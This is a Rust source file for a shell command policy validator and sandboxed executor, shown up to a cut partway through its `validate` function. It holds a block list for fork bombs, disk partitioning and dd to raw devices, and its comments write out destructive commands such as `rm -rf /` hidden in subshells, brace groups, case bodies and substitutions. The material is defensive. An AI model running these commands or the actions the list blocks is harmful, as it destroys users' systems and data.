//! Shell command policy validator and sandboxed executor.
//!
//! `validate` classifies a command string and returns a typed refusal error
//! for dangerous classes (fork bombs, disk wipes, `rm`/`del` on protected
//! roots, `dd` to devices, `sudo`/wrapper unwrapping, unexpanded shell
//! references, dead-man fuse). Benign commands pass.
//!
//! `run` executes a validated command: policy validation first (typed
//! refusal, nothing spawns), cwd resolved through the sandbox layers, spawn
//! via `tokio::process` with `process_group(0)`, stdout/stderr captured with
//! byte caps, and timeout kills the whole process group.

use std::path::Path;
#[cfg(target_os = "linux")]
use std::path::PathBuf;
use std::process::Stdio;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, OnceLock};
use std::time::{Duration, Instant};

use regex::Regex;
use thiserror::Error;
use tokio::io::AsyncReadExt;

#[derive(Debug, Error)]
pub enum ShellPolicyError {
    #[error("InvalidCommandError: Shell command must be a non-empty string")]
    InvalidCommand,
    #[error(
        "CommandSecurityError: Execution blocked. Command matches prohibited destructive pattern: {0}"
    )]
    ProhibitedPattern(String),
    #[error("CommandSecurityError: Execution blocked. Unexpanded shell reference in target '{0}'")]
    UnexpandedReference(String),
    #[error(
        "CommandSecurityError: Execution blocked. Target '{0}' resolves to protected root: {1}"
    )]
    ProtectedRoot(String, String),
    #[error("FatalDeadManFuseError: Execution halted by dead-man fuse (synthetic canary tripped)")]
    DeadManFuse,
}

pub const CANARY_DISASTER_FUSE_TOKEN: &str = "__CANARY_TRIGGER_DISASTER_FUSE__";

/// Fallback working directory and user home used by the single-argument
/// [`validate`] (and any caller that does not supply a live context). The
/// live executor passes the actual workspace root and user home through
/// [`validate_with_context`] instead of these constants.
const DEFAULT_CWD: &str = "/workspace";
const DEFAULT_HOME: &str = "/home/user";
/// Critical system directories protected against *all* destructive verbs
/// (not only `rm`). A dir and any path beneath it (`/etc/hosts`,
/// `/usr/lib/...`) is protected; deeper subpaths of the *workspace* are not.
const SYSTEM_DIRS: &[&str] = &["/etc", "/usr", "/var", "/boot", "/bin", "/lib", "/opt"];
const MAX_UNWRAP_DEPTH: usize = 4;
/// Upper bound for group recursion (`(...)`, `{...}`). Group nesting is
/// *provably* acyclic — each recursive level strictly shortens the string —
/// so this cap is a **stack-usage** bound, not a coverage one.
///
/// Every recursion level holds live frames for `analyze_command` →
/// `analyze_segment` → (`analyze_group` | `analyze_case` |
/// `analyze_substitutions`), which in the debug build cost ~4–5 KB of stack
/// each. A 2000-deep adversarial input must *terminate* without overflowing
/// the 2 MiB `#[test]` thread stack (the recursion runs on a test thread, not
/// the 8 MiB main thread). 100 leaves ≥15× headroom below the measured
/// overflow threshold (~500 levels) while staying far above any realistic
/// nesting depth (legitimate commands sit at < 10 levels; a bomb is caught
/// at any depth below the cap).
const MAX_GROUP_DEPTH: usize = 100;

/// Destructive verbs whose path operands are checked against protected roots
/// and critical system directories. `mv`/`cp` count because both their
/// source and destination can be a protected system path (`mv /etc/hosts
/// /tmp/` removes it from the system); `tee`/`truncate`/`shred`/`wipefs`
/// are in-place destruction/erasure of targets.
const DESTRUCTIVE: &[&str] = &[
    "rm",
    "del",
    "rmdir",
    "rd",
    "remove-item",
    "ri",
    "erase",
    "mv",
    "cp",
    "tee",
    "truncate",
    "shred",
    "wipefs",
];
/// Wrappers whose own argument (not an `=value`) is the real command.
/// `env` is handled separately in `analyze_segment` (it consumes
/// `KEY=VAL` prefix tokens before the real command) and is intentionally
/// absent here.
const TRANSPARENT: &[&str] = &["sudo", "doas", "nice", "nohup", "xargs"];
const WIN_FLAGS: &[&str] = &["/f", "/s", "/q", "/p", "/a", "/c", "/e", "/t", "/y", "/i"];

// ---------------------------------------------------------------------------
// Pattern-level blocks (verbatim, not path-aware).
// ---------------------------------------------------------------------------

/// Precompiled pattern-level block signatures.
/// Whitespace between tokens is tolerated (`\s*` / `\s+`) so spacing variants
/// (e.g. `:() { :|:& };`) cannot bypass the matcher.
fn pattern_blocks() -> &'static [(&'static str, Regex)] {
    static BLOCKS: OnceLock<Vec<(&'static str, Regex)>> = OnceLock::new();
    BLOCKS.get_or_init(|| {
        vec![
            (
                "fork bomb",
                Regex::new(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;").unwrap(),
            ),
            (
                "disk partitioning",
                Regex::new(r"\b(mkfs(\.[a-z0-9]+)?|fdisk|parted)\b").unwrap(),
            ),
            ("drive format", Regex::new(r"\bformat\s+[A-Za-z]:").unwrap()),
            (
                "dd to raw device",
                Regex::new(r"\bdd\s+.*of=/dev/(sd[a-z]|nvme|hd[a-z]|vd[a-z])").unwrap(),
            ),
        ]
    })
}

fn pattern_level_block(cmd: &str) -> Option<&'static str> {
    let lower = cmd.to_ascii_lowercase();
    for (sig, re) in pattern_blocks() {
        if re.is_match(&lower) {
            return Some(sig);
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Tokenizer and segment splitter
// ---------------------------------------------------------------------------

fn tokenize(cmd: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    for ch in cmd.chars() {
        match quote {
            Some(q) if ch == q => quote = None,
            None if ch == '"' || ch == '\'' => quote = Some(ch),
            None if ch == ' ' || ch == '\t' => {
                if !cur.is_empty() {
                    tokens.push(std::mem::take(&mut cur));
                }
            }
            _ => cur.push(ch),
        }
    }
    if !cur.is_empty() {
        tokens.push(cur);
    }
    tokens
}

fn flush_seg(segments: &mut Vec<String>, cur: &mut String) {
    let t = cur.trim().to_string();
    if !t.is_empty() {
        segments.push(t);
    }
    cur.clear();
}

/// Characters that delimit words in a group-delimiter scan: whitespace, the
/// always-special metacharacters, and the word-start-sensitive delimiters
/// themselves.
fn is_delimiter_boundary(ch: char) -> bool {
    matches!(
        ch,
        ' ' | '\t' | ';' | '&' | '|' | '(' | ')' | '{' | '}' | '<' | '>' | '\n' | '\r'
    )
}

/// A brace-group `{` (opener) and `}` (closer) must be a word of their own:
/// `x{` and `b}` are literal characters, `{ a; }` is a brace group.
fn is_standalone_brace(chars: &[char], i: usize) -> bool {
    let word_start = i == 0 || is_delimiter_boundary(chars[i - 1]);
    let word_end = i + 1 >= chars.len() || is_delimiter_boundary(chars[i + 1]);
    word_start && word_end
}

/// A `(` is a structural opener (subshell / `$(...)` substitution) when it
/// starts a word or follows `$` (`a$(x)` is valid bash; a bare `a(x)` is a
/// syntax error).
fn is_structural_open(chars: &[char], i: usize) -> bool {
    i == 0
        || is_delimiter_boundary(chars[i - 1])
        || chars[i - 1] == '$'
}

/// Splits a command into segments on the top-level shell separators
/// `&&`, `&`, `||`, `|`, `;`, newlines, and `)` terminators (group ends,
/// `$(...)` ends, and unmatched `case` pattern closers).
///
/// Two protections matter for policy soundness:
///
/// 1. A **standalone `&`** (background-job separator) delimits, not only
///    `&&` — `echo ok & rm -rf /` must become two segments so the `rm` is
///    analyzed on its own.
/// 2. Separators inside **balanced `(...)` / `{...}` groups do not split**:
///    a subshell or brace group is one unit, so `(cd /; rm -rf /)` and
///    `{ rm -rf /; }` stay whole and can be recursively analyzed via
///    [`analyze_group`]. (An *unclosed* group is a bash syntax error —
///    nothing executes — so swallowing the rest is safe.)
///
/// Group delimiters are recognized with bash's rules: `(` / `)` are
/// *always* metacharacters (mid-word or not), while `{` / `}` count only
/// when they form a word of their own ([`is_standalone_brace`]), so literal
/// braces glued to words (`a{b`, `b}`) never shadow a real separator.
/// Quotes are tracked; a separator or delimiter inside quotes never acts.
fn split_segments(cmd: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut paren_depth: usize = 0;
    let mut brace_depth: usize = 0;
    let chars: Vec<char> = cmd.chars().collect();
    let n = chars.len();
    let mut i = 0;
    while i < n {
        let ch = chars[i];
        if let Some(q) = quote {
            if ch == q {
                quote = None;
            }
            cur.push(ch);
            i += 1;
            continue;
        }
        if ch == '"' || ch == '\'' {
            quote = Some(ch);
            cur.push(ch);
            i += 1;
            continue;
        }
        // `(` / `)` are always metacharacters (even mid-word); `{` / `}`
        // count only as a standalone word, so literal braces glued to words
        // (`a{b`, `b}`) never shadow a real separator.
        let closes_outer = ch == ')' && paren_depth > 0;
        match ch {
            '(' if is_structural_open(&chars, i) => paren_depth += 1,
            ')' if closes_outer => paren_depth -= 1,
            '{' if is_standalone_brace(&chars, i) => brace_depth += 1,
            '}' if is_standalone_brace(&chars, i) => {
                brace_depth = brace_depth.saturating_sub(1)
            }
            _ => {}
        }
        // A `)` ending the current context — group end, `$(...)` end, or an
        // unmatched `case` pattern closer (`pat) cmd`) — terminates the
        // current list, so it is part of the segment but flushes it after.
        let terminator = ch == ')'
            && (closes_outer || (i == 0 || is_delimiter_boundary(chars[i - 1])));
        let at_top_level = paren_depth == 0 && brace_depth == 0;
        if at_top_level
            && (matches!(ch, '&' | '|' | ';' | '\n' | '\r') || terminator)
        {
            // `&&` / `||` consume both characters; everything else is a
            // single-character separator.
            if matches!(ch, '&' | '|') && i + 1 < n && chars[i + 1] == ch {
                i += 2;
            } else {
                i += 1;
            }
            if terminator {
                cur.push(ch);
            }
            flush_seg(&mut segments, &mut cur);
            continue;
        }
        cur.push(ch);
        i += 1;
    }
    flush_seg(&mut segments, &mut cur);
    segments
}

// ---------------------------------------------------------------------------
// Path normalization
// ---------------------------------------------------------------------------

fn command_name(token: &str) -> String {
    let parts: Vec<&str> = token.split(['/', '\\']).collect();
    parts.last().unwrap_or(&"").to_ascii_lowercase()
}

fn is_flag(token: &str) -> bool {
    if token.starts_with('-') {
        return true;
    }
    WIN_FLAGS.contains(&token.to_ascii_lowercase().as_str())
}

fn has_unexpanded_ref(operand: &str) -> bool {
    operand.contains('$') || operand.contains('`')
}

fn is_env_assignment(token: &str) -> bool {
    let bytes = token.as_bytes();
    if bytes.is_empty() {
        return false;
    }
    if !bytes[0].is_ascii_alphabetic() && bytes[0] != b'_' {
        return false;
    }
    for (i, &b) in bytes.iter().enumerate() {
        if b == b'=' {
            return i > 0;
        }
        if !b.is_ascii_alphanumeric() && b != b'_' {
            return false;
        }
    }
    false
}

fn expand_tilde(operand: &str, home: &str, is_win: bool) -> String {
    if operand == "~" {
        return home.to_string();
    }
    if operand.starts_with("~/") || operand.starts_with("~\\") {
        return format!("{home}{}", operand[1..].replace('\\', "/"));
    }
    if let Some(rest) = operand.strip_prefix('~')
        && !rest.is_empty()
        && rest.as_bytes()[0] != b'/'
        && rest.as_bytes()[0] != b'\\'
    {
        if is_win {
            return format!("C:\\Users\\{rest}");
        }
        if rest == "root" {
            return "/root".to_string();
        }
        return format!("/home/{rest}");
    }
    operand.to_string()
}

fn to_posix(p: &str, home: &str) -> String {
    let t = p.trim();
    if t.is_empty() {
        return home.to_string();
    }
    if let Some(rest) = t
        .strip_prefix(r"\\wsl.localhost\")
        .or_else(|| t.strip_prefix(r"\\wsl$\\"))
    {
        let parts: Vec<&str> = rest.split('\\').collect();
        if parts.len() >= 2 {
            let sub = parts[1..].join("/");
            return format!("/{sub}");
        }
    }
    if t.len() >= 3 {
        let b0 = t.as_bytes()[0];
        let b1 = t.as_bytes()[1];
        if b0.is_ascii_alphabetic()
            && b1 == b':'
            && (t.as_bytes()[2] == b'\\' || t.as_bytes()[2] == b'/')
        {
            let drive = b0 as char;
            let sub = t[3..].replace('\\', "/");
            return format!("/mnt/{}/{}", drive.to_ascii_lowercase(), sub);
        }
    }
    if t.len() >= 3 && t.starts_with('/') {
        let b1 = t.as_bytes()[1];
        if b1.is_ascii_alphabetic() && t.as_bytes()[2] == b'/' {
            let drive = b1 as char;
            let sub = t[3..].to_string();
            return format!("/mnt/{}/{}", drive.to_ascii_lowercase(), sub);
        }
    }
    t.replace('\\', "/")
}

fn posix_normalize(p: &str) -> String {
    use path_clean::PathClean;
    let cleaned = std::path::Path::new(p).clean();
    let s = cleaned.to_string_lossy().replace('\\', "/");
    if s.is_empty() || s == "." {
        "/".to_string()
    } else if !s.starts_with('/') {
        format!("/{s}")
    } else {
        s
    }
}

/// Unicode/homoglyph defense: normalize compatibility forms and fullwidth
/// characters to their canonical ASCII equivalents via standard NFKC
/// so homoglyphs cannot evade the protected-root policy check.
fn nfkc_fold(s: &str) -> String {
    use unicode_normalization::UnicodeNormalization;
    s.nfkc().collect()
}

fn normalize_operand(operand: &str, cwd: &str, home: &str, is_win: bool) -> String {
    let p = expand_tilde(operand, home, is_win);
    let p = nfkc_fold(&p);
    let mut posix = to_posix(&p, home);
    let mut wildcard = "";
    if posix.ends_with("/*") {
        wildcard = "/*";
        posix = posix[..posix.len() - 2].to_string();
    } else if posix.ends_with('*') {
        wildcard = "*";
        posix = posix[..posix.len() - 1].to_string();
    }
    if posix.is_empty() {
        posix = "/".to_string();
    }
    if !posix.starts_with('/') {
        let cwd_posix = to_posix(cwd, home);
        posix = posix_normalize(&format!("{cwd_posix}/{posix}"));
    } else {
        posix = posix_normalize(&posix);
    }
    if posix != "/" && posix.ends_with('/') {
        while posix.ends_with('/') {
            posix.pop();
        }
    }
    if !wildcard.is_empty() {
        posix = if posix == "/" {
            wildcard.to_string()
        } else {
            format!("{posix}{wildcard}")
        };
    }
    posix.to_ascii_lowercase()
}

// ---------------------------------------------------------------------------
// Protected roots
// ---------------------------------------------------------------------------

fn protected_roots() -> &'static [String] {
    static ROOTS: OnceLock<Vec<String>> = OnceLock::new();
    ROOTS.get_or_init(|| {
        let mut v = vec!["/".to_string(), "/root".to_string(), "/home".to_string()];
        for c in b'a'..=b'z' {
            v.push(format!("/mnt/{}", c as char));
        }
        v.push("/mnt/c/windows".to_string());
        v.push("/mnt/c/users".to_string());
        v.push("/mnt/c/program files".to_string());
        v
    })
}

fn is_home_user(p: &str) -> bool {
    let rest = p.strip_prefix("/home/").unwrap_or("");
    !rest.is_empty() && !rest.contains('/')
}

fn is_dev_target(p: &str) -> bool {
    let rest = match p.strip_prefix("/dev/") {
        Some(r) => r,
        None => return false,
    };
    let name = match rest.strip_suffix("/*") {
        Some(n) => n,
        None => rest,
    };
    let (kind, tail) = match name {
        n if n.len() >= 3 && &n[..2] == "sd" => ("sd", &n[2..]),
        n if n.len() >= 3 && &n[..2] == "hd" => ("hd", &n[2..]),
        n if n.len() >= 3 && &n[..2] == "vd" => ("vd", &n[2..]),
        n if n.len() >= 5 && &n[..4] == "nvme" => ("nvme", &n[4..]),
        _ => return false,
    };
    match kind {
        "sd" | "hd" | "vd" => !tail.is_empty() && tail.chars().all(|c| c.is_ascii_lowercase()),
        "nvme" => {
            let d1: String = tail.chars().take_while(|c| c.is_ascii_digit()).collect();
            let rem = &tail[d1.len()..];
            let rem = match rem.strip_prefix('n') {
                Some(r) => r,
                None => return false,
            };
            let d2: String = rem.chars().take_while(|c| c.is_ascii_digit()).collect();
            !d1.is_empty() && !d2.is_empty() && rem.len() == d2.len()
        }
        _ => false,
    }
}

/// Returns true if `p` is a critical system directory ([`SYSTEM_DIRS`]) or
/// any path beneath it (`/etc/hosts`, `/usr/lib/x`). Applied to *every*
/// destructive verb (not only `rm`) so that `mv`/`cp`/`tee`/`truncate`/
/// `shred`/`wipefs` cannot destroy system files. Deeper subpaths of the
/// *workspace* are unaffected (a system dir only anchors an absolute path).
fn is_protected_system_dir(p: &str) -> bool {
    let p = p.to_ascii_lowercase();
    let probe = if p.ends_with("/*") {
        &p[..p.len() - 2]
    } else if p.ends_with('*') {
        &p[..p.len() - 1]
    } else {
        p.as_str()
    };
    for dir in SYSTEM_DIRS {
        if probe == *dir || probe.starts_with(&format!("{dir}/")) {
            return true;
        }
    }
    false
}

/// Returns true if `p` is a protected root (whole filesystem, `/root`, a
/// `/home/<user>` account, or a WSL mount) or a critical system directory.
fn is_protected_root(p: &str) -> bool {
    let p = p.to_ascii_lowercase();
    if is_dev_target(&p) {
        return true;
    }
    if is_protected_system_dir(&p) {
        return true;
    }
    for root in protected_roots() {
        if p == *root {
            return true;
        }
        let w = if *root == "/" {
            "/*"
        } else {
            &format!("{root}/*")
        };
        if p == w {
            return true;
        }
    }
    if p == "/root" || is_home_user(&p) {
        return true;
    }
    false
}

// ---------------------------------------------------------------------------
// Shell wrapper recursion
// ---------------------------------------------------------------------------

fn shell_wrapper(name: &str) -> Option<(&'static [&'static str], &'static str)> {
    match name {
        "bash" | "sh" | "dash" | "zsh" => Some((&["-c"], "single")),
        "cmd" | "cmd.exe" => Some((&["/c"], "rest")),
        "powershell" | "pwsh" => Some((&["-command"], "single")),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Group traversal
// ---------------------------------------------------------------------------

/// Finds the first **unquoted** group in `cmd` (a subshell `(...)` or a brace
/// group `{...}`, possibly nested inside the other), extracts it, and
/// recursively analyzes the three parts as fresh commands:
///
/// ```text
/// [prefix] ( group body ) [suffix]
/// [prefix] { group body } [suffix]
/// ```
///
/// This closes two bypasses:
///
/// - **subshells** — `cd /tmp && (rm -rf /)` and `if true; then (rm -rf /)`
///   keep the `rm` inside parentheses where a naive segment splitter would
///   only see the wrapper;
/// - **brace groups** — `{ rm -rf /; }`: because the splitter no longer
///   splits inside balanced braces, the group arrives intact and its body
///   (including everything after an inner `;`) is analyzed.
///
/// Quoted delimiters never count (`echo "(rm -rf /)"` is data, not a group).
/// An *unclosed* group is a bash syntax error — nothing executes — so it is
/// analyzed as an ordinary segment. Recursion is bounded by
/// [`MAX_GROUP_DEPTH`] (the string strictly shrinks at every level, so the
/// bound only limits stack usage, not coverage of real inputs).
fn analyze_group(cmd: &str, cwd: &str, home: &str, depth: usize) -> Result<(), ShellPolicyError> {
    if depth >= MAX_GROUP_DEPTH {
        return Ok(());
    }

    let chars: Vec<char> = cmd.chars().collect();
    let mut quote: Option<char> = None;
    let mut start: Option<(usize, char)> = None;
    let mut close: Option<usize> = None;
    let mut paren: usize = 0;
    let mut brace: usize = 0;
    for (i, &ch) in chars.iter().enumerate() {
        if let Some(q) = quote {
            if ch == q {
                quote = None;
            }
            continue;
        }
        if ch == '"' || ch == '\'' {
            quote = Some(ch);
            continue;
        }
        match ch {
            '(' => {
                if start.is_none() && paren == 0 && brace == 0 {
                    start = Some((i, '('));
                }
                paren += 1;
            }
            ')' => paren = paren.saturating_sub(1),
            '{' if is_standalone_brace(&chars, i) => {
                if start.is_none() && paren == 0 && brace == 0 {
                    start = Some((i, '{'));
                }
                brace += 1;
            }
            '}' if is_standalone_brace(&chars, i) => brace = brace.saturating_sub(1),
            _ => {}
        }
        if let Some((_, k)) = start
            && match k {
                '(' => paren == 0,
                _ => brace == 0,
            }
        {
            close = Some(i);
            break;
        }
    }

    let (Some((s, _)), Some(c)) = (start, close) else {
        return Ok(()); // no complete group: ordinary segment
    };

    let prefix = cmd[..s].to_string();
    let body = cmd[s + 1..c].to_string();
    let suffix = cmd[c + 1..].to_string();

    if !prefix.trim().is_empty() {
        analyze_command(&prefix, cwd, home, depth + 1)?;
    }
    let inner = body.trim().trim_matches(';').trim();
    if !inner.is_empty() {
        analyze_command(inner, cwd, home, depth + 1)?;
    }
    if !suffix.trim().is_empty() {
        analyze_command(&suffix, cwd, home, depth + 1)?;
    }
    Ok(())
}

/// Analyzes the bodies of `case` patterns.
///
/// The splitter treats `)` as a list terminator, so `case $X in rm)
/// rm -rf / ;; esac` arrives as a piece like `case $X in rm) rm -rf /`. The
/// *pattern* (`rm`) looks like a command and gets analyzed, but the real
/// payload is the **body** after the pattern — which executes whenever `$X`
/// happens to equal the pattern (e.g. the attacker runs `X=rm` first). The
/// pattern is data; the body is the command. This walks `P) B ;; P2) B2 ;;`
/// (up to the last standalone `esac`) and recursively analyzes every body.
///
/// Group delimiters inside a body count toward depth, so a `)` closing a
/// subshell inside the body never terminates the pattern; quoted `)` and
/// `;;` never count.
fn analyze_case(cmd: &str, cwd: &str, home: &str, depth: usize) -> Result<(), ShellPolicyError> {
    if depth >= MAX_GROUP_DEPTH {
        return Ok(());
    }
    if !cmd.trim_start().to_ascii_lowercase().starts_with("case ") {
        return Ok(());
    }

    let lower: Vec<char> = cmd.to_ascii_lowercase().chars().collect();

    // `case <word> in ...`: find the keyword `in` as a standalone word
    // (the cased word is a single token, so it cannot contain `in`).
    let mut in_idx: Option<usize> = None;
    for (i, &ch) in lower.iter().enumerate() {
        if ch == 'i'
            && lower.get(i + 1) == Some(&'n')
            && (i == 0 || is_delimiter_boundary(lower[i - 1]))
            && (i + 2 >= lower.len() || is_delimiter_boundary(lower[i + 2]))
        {
            in_idx = Some(i + 2);
            break;
        }
    }
    let Some(in_idx) = in_idx else {
        return Ok(());
    };

    // The pattern/body region runs from after `in` to the last standalone
    // `esac` word (an unclosed `case` is a bash syntax error — nothing
    // executes — so its tail still gets analyzed below).
    let region_chars: Vec<char> = lower[in_idx..].to_vec();
    let mut body_end = region_chars.len();
    for (i, &ch) in region_chars.iter().enumerate() {
        if ch == 'e'
            && region_chars.get(i + 1) == Some(&'s')
            && region_chars.get(i + 2) == Some(&'a')
            && region_chars.get(i + 3) == Some(&'c')
            && (i == 0 || is_delimiter_boundary(region_chars[i - 1]))
            && (i + 4 >= region_chars.len()
                || is_delimiter_boundary(region_chars[i + 4]))
        {
            body_end = i;
        }
    }
    let region: String = region_chars[..body_end].iter().collect();

    let rchars: Vec<char> = region.chars().collect();
    let mut quote: Option<char> = None;
    let mut paren: usize = 0;
    let mut brace: usize = 0;
    let mut body_start: Option<usize> = None;
    let mut i = 0;
    while i < rchars.len() {
        let ch = rchars[i];
        if let Some(q) = quote {
            if ch == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        if ch == '"' || ch == '\'' {
            quote = Some(ch);
            i += 1;
            continue;
        }
        match ch {
            '(' if is_structural_open(&rchars, i) => paren += 1,
            ')' if paren > 0 => paren -= 1,
            '{' if is_standalone_brace(&rchars, i) => brace += 1,
            '}' if is_standalone_brace(&rchars, i) => {
                brace = brace.saturating_sub(1)
            }
            _ => {}
        }
        let at_top = paren == 0 && brace == 0;
        let flush_body = |s: usize, e: usize| -> Result<(), ShellPolicyError> {
            let body = &region[s..e];
            if !body.trim().is_empty() {
                analyze_command(body, cwd, home, depth + 1)
            } else {
                Ok(())
            }
        };
        if at_top && ch == ')' {
            // Pattern terminator: a previous pattern's body ends here.
            if let Some(s) = body_start.take() {
                flush_body(s, i)?;
            }
            body_start = Some(i + 1);
        } else if at_top && ch == ';' && rchars.get(i + 1) == Some(&';') {
            // End of the current body (a lone `;` inside a body is part of
            // the body's own command list — analyzed with it).
            if let Some(s) = body_start.take() {
                flush_body(s, i)?;
            }
            i += 1;
        }
        i += 1;
    }
    if let Some(s) = body_start {
        let body = region[s..].to_string();
        if !body.trim().is_empty() {
            analyze_command(&body, cwd, home, depth + 1)?;
        }
    }
    Ok(())
}

/// Recursively analyzes the bodies of command substitutions: `$(...)` and
/// backtick `` `...` ``.
///
/// A substitution is a *hidden command*: `X=$(rm -rf /)` is lexically a
/// single assignment word (and a naive operand check only sees `$(...)` as
/// an unexpanded reference *when it is an operand of a destructive
/// command*), so the body would otherwise execute untouched. Quoted `$(...)`
/// and backticks are data, not substitutions. Nesting is bounded by
/// [`MAX_GROUP_DEPTH`] (the string strictly shrinks at every level).
fn analyze_substitutions(
    cmd: &str,
    cwd: &str,
    home: &str,
    depth: usize,
) -> Result<(), ShellPolicyError> {
    if depth >= MAX_GROUP_DEPTH {
        return Ok(());
    }
    let chars: Vec<char> = cmd.chars().collect();
    let mut quote: Option<char> = None;
    let mut i = 0;
    while i < chars.len() {
        let ch = chars[i];
        if let Some(q) = quote {
            if ch == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        if ch == '"' || ch == '\'' {
            quote = Some(ch);
            i += 1;
            continue;
        }
        if ch == '$' && i + 1 < chars.len() && chars[i + 1] == '(' {
            // `$(...)`: scan for the balanced close.
            let mut paren = 1usize;
            let mut j = i + 2;
            while j < chars.len() && paren > 0 {
                let cj = chars[j];
                if quote.is_none() {
                    if cj == '"' || cj == '\'' {
                        quote = Some(cj);
                    } else if cj == '(' {
                        paren += 1;
                    } else if cj == ')' {
                        paren -= 1;
                    }
                } else if cj == quote.unwrap() {
                    quote = None;
                }
                j += 1;
            }
            if paren == 0 && j <= chars.len() {
                let body = cmd[i + 2..j - 1].to_string();
                if !body.trim().is_empty() {
                    analyze_command(&body, cwd, home, depth + 1)?;
                }
                i = j;
                continue;
            }
            // Unclosed substitution: bash syntax error, cannot execute —
            // scan past it.
            break;
        }
        if ch == '`' {
            // Backtick substitution: to the next unquoted backtick.
            let mut j = i + 1;
            while j < chars.len() && chars[j] != '`' {
                j += 1;
            }
            if j < chars.len() {
                let body = cmd[i + 1..j].to_string();
                if !body.trim().is_empty() {
                    analyze_command(&body, cwd, home, depth + 1)?;
                }
                i = j + 1;
                continue;
            }
            break; // unclosed backtick: syntax error, cannot execute
        }
        i += 1;
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Core analysis
// ---------------------------------------------------------------------------

fn analyze_segment(cmd: &str, cwd: &str, home: &str, depth: usize) -> Result<(), ShellPolicyError> {
    let tokens = tokenize(cmd);
    if tokens.is_empty() {
        return Ok(());
    }

    // Groups (`(...)` / `{...}`) recurse first; the group body is analyzed as
    // a fresh command and this segment's remainder is analyzed below.
    analyze_group(cmd, cwd, home, depth)?;
    // `case` bodies: the pattern after `in` is data, the command after `)`
    // is the payload — analyze every body.
    analyze_case(cmd, cwd, home, depth)?;
    // Command substitutions (`$(...)`, backticks) are hidden commands.
    analyze_substitutions(cmd, cwd, home, depth)?;

    let mut i = 0;
    while i < tokens.len() {
        let name = command_name(&tokens[i]);
        if name == "env" {
            // Consume `KEY=VAL` assignments and `env` flags (`-i`, `-u`,
            // `-0`, ...). Whatever follows — e.g. `rm` — is the real command:
            // fall through and analyze it below. Never stop at the wrapper.
            i += 1;
            while i < tokens.len() && (is_env_assignment(&tokens[i]) || is_flag(&tokens[i])) {
                i += 1;
            }
            if i >= tokens.len() {
                return Ok(()); // bare `env` with nothing wrapped
            }
        } else if TRANSPARENT.contains(&name.as_str()) {
            i += 1;
            continue;
        } else {
            break;
        }
    }
    if i >= tokens.len() {
        return Ok(());
    }

    let name = command_name(&tokens[i]);

    if let Some((flags, inner)) = shell_wrapper(&name) {
        if depth < MAX_UNWRAP_DEPTH
            && i + 1 < tokens.len()
            && flags.contains(&tokens[i + 1].to_ascii_lowercase().as_str())
        {
            let inner_cmd = if inner == "single" {
                tokens.get(i + 2).cloned()
            } else {
                (i + 2 < tokens.len()).then(|| tokens[i + 2..].join(" "))
            };
            if let Some(inner_cmd) = inner_cmd {
                analyze_command(&inner_cmd, cwd, home, depth + 1)?;
            }
        }
        return Ok(());
    }

    if DESTRUCTIVE.contains(&name.as_str()) {
        let is_win = name != "rm";
        let mut operands = Vec::new();
        for tok in tokens.iter().skip(i + 1) {
            if let Some(eq) = tok.find('=')
                && eq > 0
                && (tok.starts_with('-') || tok.starts_with('/'))
            {
                let value = &tok[eq + 1..];
                if !value.is_empty() {
                    operands.push(value.to_string());
                }
                continue;
            }
            if !is_flag(tok) {
                operands.push(tok.clone());
            }
        }
        for operand in &operands {
            if has_unexpanded_ref(operand) {
                return Err(ShellPolicyError::UnexpandedReference(operand.clone()));
            }
            let normalized = normalize_operand(operand, cwd, home, is_win);
            if is_protected_root(&normalized) {
                return Err(ShellPolicyError::ProtectedRoot(operand.clone(), normalized));
            }
        }
    }

    Ok(())
}

fn analyze_command(cmd: &str, cwd: &str, home: &str, depth: usize) -> Result<(), ShellPolicyError> {
    if let Some(sig) = pattern_level_block(cmd) {
        return Err(ShellPolicyError::ProhibitedPattern(sig.to_string()));
    }
    for seg in split_segments(cmd) {
        analyze_segment(&seg, cwd, home, depth)?;
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/// Best-effort discovery of the actual user home directory.
///
/// On Unix the `HOME` environment variable is authoritative; on Windows the
/// `USERPROFILE` (falling back to `HOMEPATH` + `HOMEDRIVE`) is used. When
/// neither is set this returns [`None`] and callers fall back to
/// [`DEFAULT_HOME`]. This keeps the *live* executor honest (it passes the
/// real home of the invoking user) while the single-argument [`validate`]
/// stays deterministic for tests.
fn resolve_home() -> Option<String> {
    if cfg!(windows) {
        if let Some(p) = std::env::var_os("USERPROFILE")
            && !p.is_empty()
        {
            return Some(p.to_string_lossy().into_owned());
        }
        if let Some(h) = std::env::var_os("HOMEPATH")
            && !h.is_empty()
        {
            let h = h.to_string_lossy().into_owned();
            let drive = std::env::var("HOMEDRIVE").unwrap_or_else(|_| "C:".into());
            return Some(format!("{drive}{h}"));
        }
        return None;
    }
    std::env::var_os("HOME")
        .filter(|p| !p.is_empty())
        .map(|p| p.to_string_lossy().into_owned())
}

/// Validates a command against the shell security policy using the actual
/// working directory and user home.
///
/// This is the entry point used by the live executor (`run_async`), so the
/// policy sees the *real* workspace root and the *real* user home rather
/// than the [`DEFAULT_CWD`] / [`DEFAULT_HOME`] fallbacks. An empty home
/// path resolves back to [`DEFAULT_HOME`].
pub fn validate_with_context(cmd: &str, cwd: &Path, home: &Path) -> Result<(), ShellPolicyError> {
    if cmd.trim().is_empty() {
        return Err(ShellPolicyError::InvalidCommand);
    }
    if cmd.contains(CANARY_DISASTER_FUSE_TOKEN) {
        return Err(ShellPolicyError::DeadManFuse);
    }
    let cwd_owned = cwd.to_string_lossy().into_owned();
    let cwd_str = cwd_owned.as_str();
    let home_owned = if home.as_os_str().is_empty() {
        None
    } else {
        Some(home.to_string_lossy().into_owned())
    };
    match &home_owned {
        None => analyze_command(cmd, cwd_str, DEFAULT_HOME, 0),
        Some(h) => analyze_command(cmd, cwd_str, h.as_str(), 0),
    }
}

pub fn validate(cmd: &str) -> Result<(), ShellPolicyError> {
    if cmd.trim().is_empty() {
        return Err(ShellPolicyError::InvalidCommand);
    }
